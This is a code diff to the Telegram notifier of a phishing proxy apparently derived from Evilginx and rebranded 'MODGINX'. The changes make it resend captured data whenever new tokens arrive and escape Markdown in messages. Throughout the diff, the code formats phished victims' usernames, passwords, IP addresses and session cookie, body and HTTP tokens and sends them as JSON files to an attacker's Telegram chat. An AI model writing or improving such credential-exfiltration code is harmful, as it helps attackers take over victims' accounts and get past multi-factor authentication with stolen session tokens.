@@ -142,6 +142,7 @@ func (t *TelegramBot) sendInitialNotification(session *Session, sessionIndex int
 		session.TelegramMessageID = messageId
 		session.TelegramFileID = fileId
 		session.TelegramNotified = true
+		session.LastTokenUpdate = int64(len(session.CookieTokens) + len(session.BodyTokens) + len(session.HttpTokens))
 		
 		os.Remove(jsonFile)
 		log.Success("telegram: initial notification with JSON sent for session %d", sessionIndex)
@@ -200,23 +201,42 @@ func (t *TelegramBot) updateMessageAndFile(session *Session, sessionIndex int, p
 	}
 	defer os.Remove(jsonFile)
 	
-	// Update message caption
-	caption := t.formatSessionCaption(session, sessionIndex, phishletName)
-	err = t.editMessage(session.TelegramMessageID, caption)
-	if err != nil {
-		log.Warning("telegram: failed to edit message, trying to send new one: %v", err)
-		// Fallback: send new document
+	// Check if token count has changed significantly (new tokens added)
+	currentTokenCount := len(session.CookieTokens) + len(session.BodyTokens) + len(session.HttpTokens)
+	tokenCountChanged := currentTokenCount != session.LastTokenUpdate
+	
+	if tokenCountChanged {
+		// Send new JSON file with updated tokens
+		caption := t.formatSessionCaption(session, sessionIndex, phishletName)
+		caption += fmt.Sprintf("\n\n🔄 *Updated:* %s", time.Now().Format("15:04:05"))
+		
 		messageId, fileId, err := t.sendDocumentWithIds(jsonFile, caption)
 		if err != nil {
-			return err
+			log.Error("telegram: failed to send updated document: %v", err)
+			// Fallback to message update only
+			return t.updateMessage(session, sessionIndex, phishletName)
 		}
+		
+		// Update session with new message info
 		session.TelegramMessageID = messageId
 		session.TelegramFileID = fileId
-		return nil
+		session.LastTokenUpdate = int64(currentTokenCount)
+		
+		log.Success("telegram: sent updated JSON file for session %d (tokens: %d)", sessionIndex, currentTokenCount)
+	} else {
+		// Just update the message caption
+		caption := t.formatSessionCaption(session, sessionIndex, phishletName)
+		caption += fmt.Sprintf("\n\n🔄 *Last Update:* %s", time.Now().Format("15:04:05"))
+		
+		err = t.editMessage(session.TelegramMessageID, caption)
+		if err != nil {
+			log.Warning("telegram: failed to edit message: %v", err)
+			return err
+		}
+		
+		log.Debug("telegram: updated message caption for session %d", sessionIndex)
 	}
 	
-	// Note: Telegram doesn't allow editing document files, so we keep the original file
-	// The updated data is reflected in the message caption
 	return nil
 }
 
@@ -240,26 +260,26 @@ func (t *TelegramBot) hasValidSessionData(session *Session) bool {
 func (t *TelegramBot) formatSessionMessage(session *Session, sessionIndex int, phishletName string) string {
 	var message strings.Builder
 	
-	message.WriteString("🎣 *Evilginx Session Captured*\n\n")
+	message.WriteString("🎣 *MODGINX Session Captured*\n\n")
 	message.WriteString(fmt.Sprintf("📊 *Session ID:* %d\n", sessionIndex))
-	message.WriteString(fmt.Sprintf("🎯 *Phishlet:* %s\n", phishletName))
-	message.WriteString(fmt.Sprintf("🌐 *IP Address:* %s\n", session.RemoteAddr))
-	message.WriteString(fmt.Sprintf("🖥️ *User Agent:* %s\n", session.UserAgent))
+	message.WriteString(fmt.Sprintf("🎯 *Phishlet:* %s\n", t.escapeMarkdown(phishletName)))
+	message.WriteString(fmt.Sprintf("🌐 *IP Address:* %s\n", t.escapeMarkdown(session.RemoteAddr)))
+	message.WriteString(fmt.Sprintf("🖥️ *User Agent:* %s\n", t.escapeMarkdown(session.UserAgent)))
 	message.WriteString(fmt.Sprintf("⏰ *Time:* %s\n\n", time.Now().Format("2006-01-02 15:04:05")))
 
 	// Add credentials if available
 	if session.Username != "" {
-		message.WriteString(fmt.Sprintf("👤 *Username:* %s\n", session.Username))
+		message.WriteString(fmt.Sprintf("👤 *Username:* %s\n", t.escapeMarkdown(session.Username)))
 	}
 	if session.Password != "" {
-		message.WriteString(fmt.Sprintf("🔑 *Password:* %s\n", session.Password))
+		message.WriteString(fmt.Sprintf("🔑 *Password:* %s\n", t.escapeMarkdown(session.Password)))
 	}
 
 	// Add custom fields
 	if len(session.Custom) > 0 {
 		message.WriteString("\n📝 *Custom Fields:*\n")
 		for key, value := range session.Custom {
-			message.WriteString(fmt.Sprintf("  • %s: %s\n", key, value))
+			message.WriteString(fmt.Sprintf("  • %s: %s\n", t.escapeMarkdown(key), t.escapeMarkdown(value)))
 		}
 	}
 
@@ -319,7 +339,7 @@ func (t *TelegramBot) Test() error {
 		return fmt.Errorf("telegram bot token or chat ID not configured")
 	}
 	
-	testMessage := "🧪 *Evilginx Telegram Test*\n\nTelegram notifications are working correctly!"
+	testMessage := "🧪 *MODGINX Telegram Test*\n\nTelegram notifications are working correctly!"
 	return t.sendMessage(testMessage)
 }
 
@@ -498,21 +518,47 @@ func (t *TelegramBot) createTokensExportFile(session *Session, sessionIndex int,
 	return filePath, nil
 }
 
+// escapeMarkdown escapes special Markdown characters to prevent parsing errors
+func (t *TelegramBot) escapeMarkdown(text string) string {
+	// Escape Markdown special characters
+	replacer := strings.NewReplacer(
+		"*", "\\*",
+		"_", "\\_",
+		"[", "\\[",
+		"]", "\\]",
+		"(", "\\(",
+		")", "\\)",
+		"~", "\\~",
+		"`", "\\`",
+		">", "\\>",
+		"#", "\\#",
+		"+", "\\+",
+		"-", "\\-",
+		"=", "\\=",
+		"|", "\\|",
+		"{", "\\{",
+		"}", "\\}",
+		".", "\\.",
+		"!", "\\!",
+	)
+	return replacer.Replace(text)
+}
+
 func (t *TelegramBot) formatSessionCaption(session *Session, sessionIndex int, phishletName string) string {
 	var caption strings.Builder
 	
-	caption.WriteString("🎣 *Evilginx Session Captured*\n\n")
+	caption.WriteString("🎣 *MODGINX Session Captured*\n\n")
 	caption.WriteString(fmt.Sprintf("📊 *Session ID:* %d\n", sessionIndex))
-	caption.WriteString(fmt.Sprintf("🎯 *Phishlet:* %s\n", phishletName))
-	caption.WriteString(fmt.Sprintf("🌐 *IP Address:* %s\n", session.RemoteAddr))
+	caption.WriteString(fmt.Sprintf("🎯 *Phishlet:* %s\n", t.escapeMarkdown(phishletName)))
+	caption.WriteString(fmt.Sprintf("🌐 *IP Address:* %s\n", t.escapeMarkdown(session.RemoteAddr)))
 	caption.WriteString(fmt.Sprintf("⏰ *Time:* %s\n\n", time.Now().Format("2006-01-02 15:04:05")))
 	
 	// Add credentials if available
 	if session.Username != "" {
-		caption.WriteString(fmt.Sprintf("👤 *Username:* %s\n", session.Username))
+		caption.WriteString(fmt.Sprintf("👤 *Username:* %s\n", t.escapeMarkdown(session.Username)))
 	}
 	if session.Password != "" {
-		caption.WriteString(fmt.Sprintf("🔑 *Password:* %s\n", session.Password))
+		caption.WriteString(fmt.Sprintf("🔑 *Password:* %s\n", t.escapeMarkdown(session.Password)))
 	}
 	
 	// Add token count summary
